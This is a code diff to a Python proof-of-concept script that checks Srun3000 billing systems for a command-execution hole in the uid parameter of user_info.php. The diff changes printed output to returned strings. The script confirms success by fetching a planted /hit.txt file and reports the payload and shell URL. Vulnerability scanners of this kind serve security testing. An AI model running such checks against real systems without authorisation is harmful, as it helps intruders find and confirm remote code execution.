@@ -8,8 +8,7 @@ description: 文件user_info.php中,get参数uid存在命令执行漏洞。
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
 
 class srun_user_info_uid_rce_BaseVerify:
     def __init__(self, url):
@@ -26,12 +25,12 @@ class srun_user_info_uid_rce_BaseVerify:
             shellurl = self.url + "/hit.txt"
             req2 = requests.get(shellurl, headers=headers, timeout=10, verify=False)
             if r"81dc9bdb52d04dc20036dbd8313ed055" in req2.text:
-                cprint("[+]存在深澜软件srun3000计费系统user_info.php命令执行漏洞...(高危)\tpayload: "+vulnurl+"\nshellurl: "+shellurl, "red")
-
+                return "[+]存在深澜软件srun3000计费系统user_info.php命令执行漏洞...(高危)\tpayload: "+vulnurl+"\nshellurl: "+shellurl
+            else:
+                return "[-]no"
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-] ====>连接超时"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
     testVuln = srun_user_info_uid_rce_BaseVerify(sys.argv[1])
     testVuln.run()
